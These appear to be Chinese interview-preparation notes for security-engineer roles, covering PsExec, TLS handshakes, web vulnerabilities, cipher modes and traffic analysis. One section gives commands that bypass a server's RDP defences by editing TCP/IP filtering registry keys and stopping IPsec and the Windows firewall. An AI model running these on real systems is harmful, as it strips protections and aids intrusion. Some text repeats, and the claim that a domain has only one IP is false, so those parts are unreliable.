当前网络形势下，已出现疑似永恒之蓝病毒变种，例如：wannaRen的病毒，应对这些新的威胁，传统防护手段很难有效防范，安芯网盾内存保护系统通过硬件虚拟化技术对内存恶意行为进行监控，能够有效检测到内存中缓冲区溢出、堆栈溢出、部署shellcode、执行shellcode、等恶意行为，有效防护这类新威胁。

5、PsExec具体的实现

PsExec特点：

psexec远程运行需要远程计算机启用文件和打印共享且默认的Admin$共享映射到C:windows目录。
psexec建立连接之后目标机器上会被安装一个“PSEXESVC”服务。但是psexec安全退出之后这个服务会自动删除（在命令行下使用exit命令退出）。
PsExec详细运行过程：


TCP三次握手，通过SMB会话进行身份验证。
连接admin$共享，通过 SMB 访问默认共享文件夹 ADMIN$，写入PSEXESVC.exe文件；
利用ipc命名管道调用svcctl服务，使用ipc通道并调用svcctl这个服务，这个服务能使我们开启指定的远程服务
利用svcctl服务开启psexesvc服务
生成4个命名管道以供使用。一个psexesvc管道用于服务本身，另外的管道stdin（输入）、stdout（输出）、stderr（输出）用于重定向进程。使用创建出来的命名管道来进行通信远程控制对方电脑。
作为渗透工具的缺点

特征明显，psexec类工具会释放文件，市面上的杀毒软件基本都能检测到。
执行过程中需要安装服务，会留下日志，容易通过溯源推测出攻击过程，并且退出时偶尔会出现服务不能删除的情况。
条件限制，需要开启admin$ 445端口共享。
7.14shein笔试
网络工具

nbscan:用于扫描Windows网络上NetBIOS名字信息的程序。该程序对给出范围内的每一个地址发送NetBIOS状态查询，并且以易读的表格列出接收到的信息，对于每个响应的主机，NBTScan列出它的IP地址、NetBIOS计算机名、登录用户名和MAC地址。但只能用于局域网,NBTSCAN可以取到PC的真实IP地址和MAC地址，如果有”ARP攻击”在做怪，可以找到装有ARP攻击的PC的IP/和MAC地址。*但只能用于局域网*,NBTSCAN可以取到PC的真实IP地址和MAC地址，如果有”ARP攻击”在做怪，可以找到装有ARP攻击的PC的IP/和MAC地址。NBTSCAN可以取到PC的真实IP地址和MAC地址，如果有”ARP攻击”在做怪，可以找到装有ARP攻击的PC的IP/和MAC地址。总之，NBTSCAN可以取到PC的真实IP地址和MAC地址。

wvs: 顶级网站扫描工具的WVS。暴力破解，盲注和HTTP编辑功能；抓包；子域名挖掘；主机发现（发现同网段的主机）； 网络爬虫；网站漏洞扫描。

文件上传

dos防护web服务器

目录遍历

目录遍历最大的危害是能够让任意用户访问系统的敏感文件，继而攻陷整个服务器。例如获取linux下的/etc/passwd文件后可能会破解出root用户的密码等。

nmap语法

反序列化

即黑客通过构造恶意的序列化数据，从而控制应用在反序列化过程中需要调用的类方法，最终实现任意方法调用。如果在这些方法中有命令执行的方法，黑客就可以在服务器上执行任意的命令。

Java 序列化是指把 Java 对象转换为字节序列的过程便于保存在内存、文件、数据库中，ObjectOutputStream类的 writeObject() 方法可以实现序列化。

Java 反序列化是指把字节序列恢复为 Java 对象的过程，ObjectInputStream 类的 readObject() 方法用于反序列化。

msf数据库创建

初始化 msf 数据库

msfdb init
nginx解析漏洞

增加/.php后缀，被解析成PHP文件，好好回去看看

Tookit

鱼叉式网络钓鱼攻击 网页攻击 传染媒介式（俗称木马） 建立payloaad和listener 邮件群发攻击（夹杂木马啊payload的玩意发给你） Arduino基础攻击 无线接入点攻击 二维码攻击 Powershell攻击

3389端口无法连接

1、服务器在内网。 2、做了tcp/ip筛选。 先执行下面cmd命令： cmd /c regedit -e c:\1.reg HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip，导出注册表里关于TCP/IP筛选的第一处 cmd /c regedit -e c:\2.reg HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\Tcpip，导出注册表里关于TCP/IP筛选的第二处 cmd /c regedit -e c:\3.reg HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip”，导出注册表里关于TCP/IP筛选的第三处 然后回到c盘1.reg、2.reg、3.reg，把1.reg、2.reg、3.reg下载回来到自己的硬盘里面编辑一下，找到 EnableSecurityFilters这个字段看看dword后面的键值是否为00000000，如果为00000001就说明管理员做了 tcp/ip筛选，我们只要把1改成0就行了，2.reg和3.reg进行一样的修改。 （regedit参数为：/s 导入*.reg 文件进注册表（安静模式） /e 导出注册表文件） 3、做了ip安全策略或windows自带***。 执行cmd命令： cmd /c net stop policyagent 停掉IPSEC Services。执行cmd /c net stop sharedaccess停掉windows自带的***，然后再连3389。 4、管理员设置的终端登陆权限只有指定的用户可以。 5、***。

XSS CSRF XXE区别与防护

XSS是跨站脚本攻击，用户提交的数据中可以构造代码来执行，从而实现窃取用户信息等攻击。修复方式：对字符实体进行转义、使用HTTP Only来禁止JavaScript读取Cookie值、输入时校验、浏览器与Web应用端采用相同的字符编码。

CSRF是跨站请求伪造攻击，XSS是实现CSRF的诸多手段中的一种，是由于没有在关键操作执行时进行是否由用户自愿发起的确认。修复方式：筛选出需要防范CSRF的页面然后嵌入Token、再次输入密码、检验Referer

XXE是XML外部实体注入攻击，XML中可以通过调用实体来请求本地或者远程内容，和远程文件保护类似，会引发相关安全问题，例如敏感文件读取。修复方式：XML解析库在调用时严格禁止对外部实体的解析。

7.11虾皮安全工程师 挂经
1、简历疑惑

产出攻防技术文档：知识星球

2、协议https认证过程

图片

第一步，爱丽丝给出协议版本号、一个客户端生成的随机数（Client random），以及客户端支持的加密方法。

第二步，鲍勃确认双方使用的加密方法，并给出数字证书、以及一个服务器生成的随机数（Server random）。

第三步，爱丽丝确认数字证书有效，然后生成一个新的随机数（Premaster secret），并使用数字证书中的公钥，加密这个随机数，发给鲍勃。客户端继续发送Change Cipher Spec报文。用于告知服务端，客户端已经切换到之前协商好的加密套件（Cipher Suite）的状态，准备使用之前协商好的加密套件加密数据并传输了。客户端发送Finished报文。该报文包含连接至今全部报文的整体校验值（也就是HASH值），用来供服务器校验。

第四步，鲍勃使用自己的私钥，获取爱丽丝发来的随机数（即Premaster secret）。接着，服务器同样发送Change Cipher Spec报文。服务器同样发送Finished报文，用来供客户端校验。

第五步，爱丽丝和鲍勃根据约定的加密方法，使用前面的三个随机数，生成"对话密钥"（session key），用来加密接下来的整个对话过程。

图片

握手阶段有三点需要注意。

（1）生成对话密钥一共需要三个随机数。

（2）握手之后的对话使用"对话密钥"加密（对称加密），服务器的公钥和私钥只用于加密和解密"对话密钥"（非对称加密），无其他作用。

（3）服务器公钥放在服务器的数字证书之中。

DH算法的握手阶段

整个握手阶段都不加密（也没法加密），都是明文的。因此，如果有人窃听通信，他可以知道双方选择的加密方法，以及三个随机数中的两个。整个通话的安全，只取决于第三个随机数（Premaster secret）能不能被破解。

虽然理论上，只要服务器的公钥足够长（比如2048位），那么Premaster secret可以保证不被破解。但是为了足够安全，我们可以考虑把握手阶段的算法从默认的RSA算法，改为 Diffie-Hellman算法（简称DH算法）。

采用DH算法后，Premaster secret不需要传递，双方只要交换各自的参数，就可以算出这个随机数。

图片

第三步和第四步由传递Premaster secret变成了传递DH算法所需的参数，然后双方各自算出Premaster secret。这样就提高了安全性。

session的恢复

握手阶段用来建立SSL连接。如果出于某种原因，对话中断，就需要重新握手。

这时有两种方法可以恢复原来的session：一种叫做session ID，另一种叫做session ticket。

session ID的思想很简单，就是每一次对话都有一个编号（session ID）。如果对话中断，下次重连的时候，只要客户端给出这个编号，且服务器有这个编号的记录，双方就可以重新使用已有的"对话密钥"，而不必重新生成一把。

随机数作用

"不管是客户端还是服务器，都需要随机数，这样生成的密钥才不会每次都一样。由于SSL协议中证书是静态的，因此十分有必要引入一种随机因素来保证协商出来的密钥的随机性。对于RSA密钥交换算法来说，pre-master secret本身就是一个随机数，再加上hello消息中的随机，三个随机数通过一个密钥导出器最终导出一个对称密钥。pre-master secret的存在在于SSL协议不信任每个主机都能产生完全随机的随机数，如果随机数不随机，那么pre-mastersecret就有可能被猜出来，那么仅适用pre-master secret作为密钥就不合适了，因此必须引入新的随机因素，那么客户端和服务器加上pre-master secret三个随机数一同生成的密钥就不容易被猜出了，一个伪随机可能完全不随机，可是是三个伪随机就十分接近随机了，每增加一个自由度，随机性增加的可不是一。"

如果黑客拦截了服务器把证书发送给客户端，并对证书进行恶意修改，会出现什么情况？

第一种情况，假如黑客只是单纯的修改数字证书中的内容，那么由于数字签名的存在，客户端会很容易的判断出报文是否被篡改。

第二种情况，黑客不仅修改了数字证书的内容，并且把数字签名替换掉了，由于黑客不可能知道CA的私钥，于是在客户端用CA的公钥进行解密的时候，解密之后得不到正确的信息，也很容易判断出报文是否被修改。

第三种情况，黑客恶意的从相同的第三方CA申请了一个数字证书。由于这个CA是真实存在的，所以客户端是可以用CA的公钥进行解密，得到了黑客提供的数字证书中的公钥。但是，由于数字证书在申请的时候，会绑定一个域名，当客户端比如说浏览器，检测到这个数字证书中的域名和我们现在网页访问的域名不一致，便会发出警告，此时我们也能得 知数字证书被替换了。

为什么最后客户端和服务端都要发送一个Finish报文？

上面已经提及，Finish报文是对至今全部报文的整体校验值（也就是HASH值）。当客户端把这个值通过得到的公钥进行加密的时候，服务器得到之后对其进行解密，然后再对全部报文进行一个HASH求值。如果这个值跟解密得到的值相等的话，那么说明客户端是可信赖的。 同样的，服务器发送这样的一个整体校验值，用来客户端验证服务器是否是真正要进行通信的那一个。 综上，这个Finish报文就是用来校验双方的身份的。

3、ssl pining

证书锁定（SSL/TLS Pinning）顾名思义，将服务器提供的SSL/TLS证书内置到移动端开发的APP客户端中，当客户端发起请求时，通过比对内置的证书和服务器端证书的内容，以确定这个连接的合法性。

握手环节仍然面临（MIM中间人）攻击的可能性，因为CA证书签发机构也存在被黑客入侵的可能性，同时移动设备也面临内置证书被篡改的风险。

中间人攻击的关键就是截获服务器返回的证书并伪造证书发送给客户端骗取信任，获取随机数3，进而达成盗取信息的目的。

4、加解密

对称：DES，AES，

非对称：RSA大素数分解，ECC离散对数，DH

加密模式：ECB，CBC，OFB，CBF，CTR

1、ECB(Electronic Code Book)：

又称电子密码本模式：Electronic codebook，是最简单的块密码加密模式，加密前根据加密块大小（如AES为128位）分成若干块，之后将每块使用相同的密钥单独加密，解密同理。

特点：

（1）简单，有利于并行计算，误差不会被传送；

（2）同样的明文块会被加密成相同的密文块，不能很好的隐藏明文数据模式；

（3）加密消息块相互独立成为被攻击的弱点，不能提供严格的数据保密性，可以对明文进行主动攻击；

2、CBC模式： 密码分组链接（CBC，Cipher-block chaining）模式，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量IV。它的实现机制使加密的各段数据之间有了联系。 特点：

①不容易主动攻击，安全性好于ECB，适合传输长度长的报文,是SSL、IPSec的标准；

②每个密文块依赖于所有的信息块，明文消息中一个改变会影响所有密文块；

③发送方和接收方都需要知道初始化向量；

④主要缺点是加密过程是串行的，无法被并行化，因为在加密时，明文中的微小改变会导致其后的全部密文块发生改变，而且消息必须被填充到块大小的整数倍。而在解密时，从两个邻接的密文块中即可得到一个明文块。因此，解密过程可以被并行化，而解密时，密文中一位的改变只会导致其对应的明文块完全改变和下一个明文块中对应位发生改变，不会影响到其它明文的内容。

5、流量分析？

6、xss除了能盗用cookie还能做啥，javascript,beff

挂马

7、SQL注入

防御

宽字节

二次注入

8、SSRF防御

9、文件上传

前端还是后端？

不执行：文件服务器，防目录穿越，执行权限禁掉

10、内外网渗透流程

11、andriod安全

7.1奇安信 安全研究员 成都
1、基本情况 学校，职业规划（渗透，研究）

2、流量分析

日志分析，协议分析

网络流量分析既指特定用途的硬件设备（如绿盟的NTA），也指基于网络层的安全分析技术，在FW\IDS\IPS中很常见。相比于主机层、应用层是以日志、请求等为分析对象，流量分析面对的是更底层的网络数据包，所包含的信息元素更多，但是分析起来也更加生涩。流量分析已被应用于多个领域，如带宽资源的合理性管控、网络链路排障以及本文所要探索的安全攻防领域。

高性能网络IO，特征匹配引擎，网络传输

[1、 网络层 ] a) DDoS检测防护：目前应用最为成熟的领域， b) Web漏洞防护：基于机房出口的流量牵引，对业务接入成本最低，因为并不需要业务更改域名指向或者安装Agent插件。

c) 基于网络层的阻断：理论上，所有基于IP的流量管控拦截都可以通过这套体系实现。比如针对特定端口请求的常态拦截，防止运维同学手抖操作开放了高危端口；针对0day漏洞的虚拟补丁机制，为下游业务升级版本赢得时间窗；甚至将能力开放给到业务自助操作，从机房入口层级屏蔽业务上来自某些恶意源的异常访问、请求限速等（图示为宙斯盾的网络流量阻断配置）。

[2、 主机层 ] a) 入侵回溯：传统的主机安全检测响应EDR系统，通过Agent方式采集主机日志、命令操作等信息，然后上报到控制中心进行策略建模，从而发现主机入侵威胁。比如高风险命令注入执行，单纯基于主机端数据仅能知道发生了什么，若同时能在流量层面针对这些强特征命令字进行检测，进一步关联，就能溯源到攻击者是如何利用的。此外，流量层的检测能力，也能与主机层发现互补，形成多个铃铛的告警能力。

b) 木马通信：比如ICMP木马，进程也不会监听端口，对主机层检测能力提出更大挑战，甚至如上面提过的XDP，在协议栈之前对流量进行劫持处理，主机端tcpdump也无法抓取。而作为中间管道，在流量层进行检测分析，会是更好的补充手段。

[3、 应用层 ] a) 网络资产搜集：安全工作的前置步骤是对资产大盘的全面搜集和掌控。以漏洞扫描为例，传统方法是依靠流程和系统，让业务侧主动登记上报，再配以爬虫，但会存在漏的问题，影响覆盖率。 b) 高危资产主动发现：高危端口、高危组件和高危服务的对外开放占据了漏洞攻击的很大一部分口子，传统方法是靠主动扫描来感知，存在扫描周期和扫描被屏蔽的问题。而通过流量则可以较好的解决上述问题，内部团队曾经复盘一起安全事件，业务高危端口从对外开放到被探测利用的时间只有45秒，针对资产数量较多的大中型企业来说，很难在45秒内完成一轮扫描，而通过流量建立相关通信特征的检测，则可以实现秒级响应。及时的捕捉到这些高危通信行为，让安全团队迅速卷入，收敛风险。实现上单纯依靠入流量还不够，网络上的大量扫描和探测会带来误报，提高运营成本，结合出流量的回显关联，则能较好的解决误报问题。

c) 脆弱点/漏洞主动发现：漏洞扫描一般重点关注在对特征类漏洞的发现，发送特定构造参数或payload以触发是否存在漏洞，对于业务层面的不合规行为或者逻辑类漏洞则覆盖不足，比如敏感信息明文传输、越权、管理后台类等，这些场景却是流量分析大显身手的地方。

[4、 云时代安全能力 ] 如果流量足够多、类型足够丰富，那基于流量层面进行威胁情报建设、pdns积累、0day发现等都有实践意义，目前我们也在进行相关尝试。

3、事件分析

根据漏洞，分析受影响严重程度，威胁情报分析APT。资产测绘。提需求（需要什么数据：IP，DNS），分析（溯源），报告。

*安全信息 + 研判 = 威胁情报*

任何未经研判的安全信息，都不能称之为“威胁情报”。威胁情报用于辅助支持决策或者安全分析，未知来源和真实性的安全信息将影响决策的正确性和分析结果的准确性。

3、简历与流量分析事件分析不相关，谈谈想法

4、基础知识

什么是IP？

IP是Internet Protocol（网际互连协议）的缩写，是TCP/IP体系中的网际层协议。设计IP的目的是提高网络的可扩展性：一是解决互联网问题，实现大规模、异构网络的互联互通；二是分割顶层网络应用和底层网络技术之间的耦合关系，以利于两者的独立发展。根据端到端的设计原则，IP只为主机提供一种无连接、不可靠的、尽力而为的数据包传输服务。

Ip地址是一个32位的二进制数，通常被分割为4个“8位二进制数”（也就是4个字节）。是一种在Internet上的给主机编址的方式，也称为网际协议地址。IP地址是IP协议提供的一种统一的地址格式，它为互联网上的每一个网络和每一台主机分配一个逻辑地址，以此来屏蔽物理地址的差异。

IP和域名？

ip地址与域名是一对多的关系。一个ip地址可以对应多个域名，但是一个域名只有一个ip地址。ip地址是数字组成的，不方便记忆，所以有了域名，通过域名地址就能找到ip地址。

SYN是啥？

SYN：同步序列编号（*Synchronize Sequence Numbers*）。是TCP/IP建立连接时使用的握手信号。在客户机和服务器之间建立正常的TCP网络连接时，客户机首先发出一个SYN消息，服务器使用SYN+ACK应答表示接收到了这个消息，最后客户机再以ACK消息响应。这样在客户机和服务器之间才能建立起可靠的TCP连接，数据才可以在客户机和服务器之间传递。事实上SYN攻击并不管目标是什么系统，只要这些系统打开TCP服务就可以实施。

TCP之所以可靠，是因为它保证了传送数据包的顺序。顺序是用一个序列号来保证的。响应包内也包括一个序列号，表示接收方准备好这个序列号的包。

MAC是啥？

MAC地址（英语：Media Access Control Address），直译为媒体存取控制位址，也称为局域网地址（LAN Address），MAC位址，以太网地址（Ethernet Address）或物理地址（Physical Address），它是一个用来确认网络设备位置的位址。在OSI模型中，第三层网络层负责IP地址，第二层数据链路层则负责MAC位址 [1] 。MAC地址用于在网络中唯一标示一个网卡，一台设备若有一或多个网卡，则每个网卡都需要并会有一个唯一的MAC地址 。

ARP协议在几层？

在OSI模型中ARP协议属于链路层. 而在TCP/IP模型中，ARP协议属于网络层. OSI模型把网络划分为七层，IP地址在OSI模型的第三层，MAC地址在第二层，彼此不直接交流。. 在通过以太网发送IP数据包时，需要先封装第三层（32位IP地址）、第二层（48位MAC地址）的报头，但由于发送时只知道目标IP地址，不知道其MAC地址，又不能跨第二、三层，所以需要使用地址解析协议ARP，根据网络层IP数据包包头中的IP地址信息解析出目标硬件地址（MAC地址）信息，以保证通信的顺利进行。

ARP欺骗？

广播，在ARP回复时，发送请求包的主机A并不会验证ARP回复包的真实性，也就是不能判断回复主机A的是不是主机B。由此引出一个局域网攻击方式ARP欺骗。

TCP，UDP区别

三次握手为啥不是两次？双工，客户端确认发送与接收成功。服务器确认发送与接收成功。相互确认发送与接收正常。

DNS协议？

人们可以直接访问 wikipedia.org 来代替 IP 地址，然后域名系统（DNS）就会将它转化成便于机器识别的 IP 地址。通过域名去查询域名服务器，得到 IP 地址的过程叫做域名解析





